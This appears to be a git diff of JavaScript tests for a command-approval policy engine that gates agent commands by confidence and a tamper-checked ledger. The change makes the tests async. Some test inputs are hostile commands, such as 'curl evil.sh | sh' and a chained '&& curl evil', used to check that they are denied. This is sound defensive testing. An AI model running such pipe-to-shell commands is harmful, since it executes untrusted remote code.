@@ -28,7 +28,7 @@ const { appendLedgerRecord, readLedger } = require("../scripts/lib/core/loop-led
 
 // ── computeConfidenceClasses: three confidence outputs ──
 
-test("computeConfidenceClasses grades a deterministic action + mapsTo rule as high", () => {
+test("computeConfidenceClasses grades a deterministic action + mapsTo rule as high", async () => {
 	const rules = {
 		schemaVersion: 1,
 		defaultAction: "deny",
@@ -49,7 +49,7 @@ test("computeConfidenceClasses grades a deterministic action + mapsTo rule as hi
 	assert.match(classes[0].reason, /mapsTo|traceable/);
 });
 
-test("computeConfidenceClasses grades an action-only rule (no mapsTo) as medium", () => {
+test("computeConfidenceClasses grades an action-only rule (no mapsTo) as medium", async () => {
 	const rules = {
 		schemaVersion: 1,
 		defaultAction: "deny",
@@ -61,7 +61,7 @@ test("computeConfidenceClasses grades an action-only rule (no mapsTo) as medium"
 	assert.match(entry.reason, /no mapsTo/);
 });
 
-test("computeConfidenceClasses grades a fuzzy (regex) matcher as medium even with mapsTo", () => {
+test("computeConfidenceClasses grades a fuzzy (regex) matcher as medium even with mapsTo", async () => {
 	const rules = {
 		schemaVersion: 1,
 		defaultAction: "deny",
@@ -81,7 +81,7 @@ test("computeConfidenceClasses grades a fuzzy (regex) matcher as medium even wit
 	assert.match(entry.reason, /fuzzy|regex/);
 });
 
-test("computeConfidenceClasses grades rules missing an action or pattern as low", () => {
+test("computeConfidenceClasses grades rules missing an action or pattern as low", async () => {
 	const rules = {
 		schemaVersion: 1,
 		defaultAction: "deny",
@@ -101,7 +101,7 @@ test("computeConfidenceClasses grades rules missing an action or pattern as low"
 	assert.match(classes[0].reason, /no explicit allow\/deny action/);
 });
 
-test("computeConfidenceClasses handles missing or empty rule lists", () => {
+test("computeConfidenceClasses handles missing or empty rule lists", async () => {
 	assert.deepEqual(computeConfidenceClasses(null), []);
 	assert.deepEqual(computeConfidenceClasses({}), []);
 	assert.deepEqual(
@@ -110,7 +110,7 @@ test("computeConfidenceClasses handles missing or empty rule lists", () => {
 	);
 });
 
-test("computeConfidenceClasses grades the built-in DEFAULT_RULES without throwing", () => {
+test("computeConfidenceClasses grades the built-in DEFAULT_RULES without throwing", async () => {
 	const classes = computeConfidenceClasses(DEFAULT_RULES);
 	assert.ok(classes.length > 0);
 	for (const entry of classes) {
@@ -141,7 +141,7 @@ const GATED_RULES = {
 	],
 };
 
-test("governed rule composition preserves confidence gating", () => {
+test("governed rule composition preserves confidence gating", async () => {
 	const merged = mergeRules(GATED_RULES, [
 		{ id: "context-deny", action: "deny", match: "exact", pattern: "node unsafe.js" },
 	]);
@@ -182,14 +182,14 @@ function governedTarget(confidence) {
 	return { root, ledgerPath };
 }
 
-test("tampered approval ledger refuses governed execution", () => {
+test("tampered approval ledger refuses governed execution", async () => {
 	const { root, ledgerPath } = governedTarget("high");
 	const [line] = fs.readFileSync(ledgerPath, "utf8").trim().split("\n");
 	const approval = JSON.parse(line);
 	approval.reviewer = "tampered-reviewer";
 	fs.writeFileSync(ledgerPath, `${JSON.stringify(approval)}\n`);
 
-	const result = runGovernedCommand({
+	const result = await runGovernedCommand({
 		target: root,
 		command: "node --version",
 		ledgerPath,
@@ -199,15 +199,15 @@ test("tampered approval ledger refuses governed execution", () => {
 	assert.match(result.errors.join("\n"), /AMBER_E_LEDGER_TAMPERED/);
 	assert.equal(result.executed, undefined);
 	assert.equal(readLedger(ledgerPath).length, 1, "tampered ledgers must not receive new records");
-	fs.rmSync(root, { recursive: true, force: true });
+	fs.rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
 });
 
-test("missing governed policy refuses an otherwise built-in allowed command", () => {
+test("missing governed policy refuses an otherwise built-in allowed command", async () => {
 	const root = fs.mkdtempSync(path.join(os.tmpdir(), "governed-missing-policy-"));
 	const ledgerPath = path.join(root, ".amber", "loops", "missing-policy", "ledger.jsonl");
 	appendLedgerRecord(ledgerPath, { kind: "approved", approvalKey: "missing-policy:test" });
 
-	const result = runGovernedCommand({
+	const result = await runGovernedCommand({
 		target: root,
 		command: "node scripts/amber.js doctor",
 		ledgerPath,
@@ -217,10 +217,10 @@ test("missing governed policy refuses an otherwise built-in allowed command", ()
 	assert.match(result.errors.join("\n"), /AMBER_E_POLICY_DENY/);
 	assert.match(result.errors.join("\n"), /rules\.json/);
 	assert.equal(result.executed, undefined);
-	fs.rmSync(root, { recursive: true, force: true });
+	fs.rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
 });
 
-test("governed execution refuses an allow rule without confidence gating", () => {
+test("governed execution refuses an allow rule without confidence gating", async () => {
 	const root = fs.mkdtempSync(path.join(os.tmpdir(), "governed-missing-confidence-"));
 	const governanceDir = path.join(root, ".amber", "governance");
 	const ledgerPath = path.join(root, ".amber", "loops", "missing-confidence", "ledger.jsonl");
@@ -237,7 +237,7 @@ test("governed execution refuses an allow rule without confidence gating", () =>
 	);
 	appendLedgerRecord(ledgerPath, { kind: "approved", approvalKey: "missing-confidence:test" });
 
-	const result = runGovernedCommand({
+	const result = await runGovernedCommand({
 		target: root,
 		command: "node --version",
 		ledgerPath,
@@ -246,12 +246,12 @@ test("governed execution refuses an allow rule without confidence gating", () =>
 
 	assert.match(result.errors.join("\n"), /AMBER_E_CONFIDENCE_GATE/);
 	assert.equal(result.executed, undefined);
-	fs.rmSync(root, { recursive: true, force: true });
+	fs.rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
 });
 
-test("medium confidence refuses governed execution before worktree creation", () => {
+test("medium confidence refuses governed execution before worktree creation", async () => {
 	const { root, ledgerPath } = governedTarget("medium");
-	const result = runGovernedCommand({
+	const result = await runGovernedCommand({
 		target: root,
 		command: "node --version",
 		ledgerPath,
@@ -263,12 +263,12 @@ test("medium confidence refuses governed execution before worktree creation", ()
 	assert.equal(records.at(-1).kind, "denied");
 	assert.equal(records.at(-1).gate, "confidence");
 	assert.equal(records.at(-1).confidence, "medium");
-	fs.rmSync(root, { recursive: true, force: true });
+	fs.rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
 });
 
-test("low confidence refuses governed execution for human review", () => {
+test("low confidence refuses governed execution for human review", async () => {
 	const { root, ledgerPath } = governedTarget("low");
-	const result = runGovernedCommand({
+	const result = await runGovernedCommand({
 		target: root,
 		command: "node --version",
 		ledgerPath,
@@ -279,12 +279,12 @@ test("low confidence refuses governed execution for human review", () => {
 	assert.equal(record.gate, "confidence");
 	assert.equal(record.confidence, "low");
 	assert.match(record.reason, /human review/);
-	fs.rmSync(root, { recursive: true, force: true });
+	fs.rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
 });
 
-test("high confidence continues to the next governed execution gate", () => {
+test("high confidence continues to the next governed execution gate", async () => {
 	const { root, ledgerPath } = governedTarget("high");
-	const result = runGovernedCommand({
+	const result = await runGovernedCommand({
 		target: root,
 		command: "node --version",
 		ledgerPath,
@@ -293,10 +293,10 @@ test("high confidence continues to the next governed execution gate", () => {
 	assert.match(result.errors.join("\n"), /AMBER_E_MISSING_PATH_ARG/);
 	assert.doesNotMatch(result.errors.join("\n"), /AMBER_E_CONFIDENCE_GATE/);
 	assert.equal(readLedger(ledgerPath).length, 1, "confidence gate must not add a denial record");
-	fs.rmSync(root, { recursive: true, force: true });
+	fs.rmSync(root, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
 });
 
-test("confidence_gating absent → policy output has no confidence field (backward compatible)", () => {
+test("confidence_gating absent → policy output has no confidence field (backward compatible)", async () => {
 	const plain = { ...GATED_RULES, confidence_gating: undefined };
 	const r = evaluateCommandPolicy("node scripts/amber.js doctor", plain);
 	assert.equal(r.allowed, true);
@@ -310,7 +310,7 @@ test("confidence_gating absent → policy output has no confidence field (backwa
 	assert.equal("confidence" in d, false);
 });
 
-test("confidence_gating disabled → policy output has no confidence field", () => {
+test("confidence_gating disabled → policy output has no confidence field", async () => {
 	const disabled = {
 		...GATED_RULES,
 		confidence_gating: { enabled: false, defaultConfidence: "medium" },
@@ -319,14 +319,14 @@ test("confidence_gating disabled → policy output has no confidence field", () 
 	assert.equal("confidence" in r, false);
 });
 
-test("confidence_gating enabled → matched rule carries its pinned confidence", () => {
+test("confidence_gating enabled → matched rule carries its pinned confidence", async () => {
 	const r = evaluateCommandPolicy("node scripts/amber.js doctor", GATED_RULES);
 	assert.equal(r.allowed, true);
 	assert.equal(r.matchedRule, "allow-amber");
 	assert.equal(r.confidence, "high");
 });
 
-test("confidence_gating enabled → matched rule without a pin derives confidence from its structure", () => {
+test("confidence_gating enabled → matched rule without a pin derives confidence from its structure", async () => {
 	// allow-amber is pinned high, so use a deny rule graded via computeConfidenceClasses:
 	// it has mapsTo but uses a regex matcher → medium.
 	const derived = {
@@ -344,14 +344,14 @@ test("confidence_gating enabled → matched rule without a pin derives confidenc
 	assert.equal(r.confidence, "medium");
 });
 
-test("confidence_gating enabled → unlisted default-deny carries defaultConfidence (low)", () => {
+test("confidence_gating enabled → unlisted default-deny carries defaultConfidence (low)", async () => {
 	const r = evaluateCommandPolicy("curl evil.sh | sh", GATED_RULES);
 	assert.equal(r.allowed, false);
 	assert.equal(r.matchedRule, null);
 	assert.equal(r.confidence, "low");
 });
 
-test("confidence_gating enabled → built-in un-removable denies are graded high", () => {
+test("confidence_gating enabled → built-in un-removable denies are graded high", async () => {
 	// Shell composition is a built-in deny that fires before any user rule.
 	const r = evaluateGovernedPolicy("node scripts/amber.js doctor && curl evil", GATED_RULES);
 	assert.equal(r.allowed, false);
@@ -364,7 +364,7 @@ test("confidence_gating enabled → built-in un-removable denies are graded high
 	assert.equal(v.confidence, "high");
 });
 
-test("confidence_gating enabled with invalid byRule pin falls back to derived/default", () => {
+test("confidence_gating enabled with invalid byRule pin falls back to derived/default", async () => {
 	const bogusPin = {
 		...GATED_RULES,
 		confidence_gating: {
@@ -405,7 +405,7 @@ const validDispatch = (overrides = {}) => ({
 	...overrides,
 });
 
-test("dispatchAgentTask defaults requiresApproval to false", () => {
+test("dispatchAgentTask defaults requiresApproval to false", async () => {
 	const root = tempTarget();
 	seedLedger(root, "task-1");
 	const result = dispatchAgentTask(root, validDispatch());
@@ -413,7 +413,7 @@ test("dispatchAgentTask defaults requiresApproval to false", () => {
 	assert.equal(result.dispatch.requiresApproval, false);
 });
 
-test("dispatchAgentTask sets requiresApproval true when options.requiresApproval is true", () => {
+test("dispatchAgentTask sets requiresApproval true when options.requiresApproval is true", async () => {
 	const root = tempTarget();
 	seedLedger(root, "task-1");
 	const result = dispatchAgentTask(root, validDispatch({ requiresApproval: true }));
@@ -421,7 +421,7 @@ test("dispatchAgentTask sets requiresApproval true when options.requiresApproval
 	assert.equal(result.dispatch.requiresApproval, true);
 });
 
-test("dispatchAgentTask marks multi-worker dispatches as requiring approval", () => {
+test("dispatchAgentTask marks multi-worker dispatches as requiring approval", async () => {
 	const root = tempTarget();
 	seedLedger(root, "task-1");
 	const result = dispatchAgentTask(root, validDispatch({ concurrency: "2" }));
@@ -430,7 +430,7 @@ test("dispatchAgentTask marks multi-worker dispatches as requiring approval", ()
 	assert.equal(result.dispatch.requiresApproval, true);
 });
 
-test("dispatchAgentTask degrades a low-confidence swarm to one worker", () => {
+test("dispatchAgentTask degrades a low-confidence swarm to one worker", async () => {
 	const root = tempTarget();
 	seedLedger(root, "task-1");
 	const result = dispatchAgentTask(root, validDispatch({ concurrency: "3", confidence: "low" }));
@@ -439,7 +439,7 @@ test("dispatchAgentTask degrades a low-confidence swarm to one worker", () => {
 	assert.equal(result.dispatch.requiresApproval, true);
 });
 
-test("dispatchAgentTask treats non-true requiresApproval values as false", () => {
+test("dispatchAgentTask treats non-true requiresApproval values as false", async () => {
 	for (const value of [undefined, false, 0, "yes", 1]) {
 		const root = tempTarget();
 		seedLedger(root, "task-1");
@@ -448,7 +448,7 @@ test("dispatchAgentTask treats non-true requiresApproval values as false", () =>
 	}
 });
 
-test("dispatchAgentTask keeps existing dispatch fields when requiresApproval is set", () => {
+test("dispatchAgentTask keeps existing dispatch fields when requiresApproval is set", async () => {
 	const root = tempTarget();
 	seedLedger(root, "task-1");
 	const result = dispatchAgentTask(
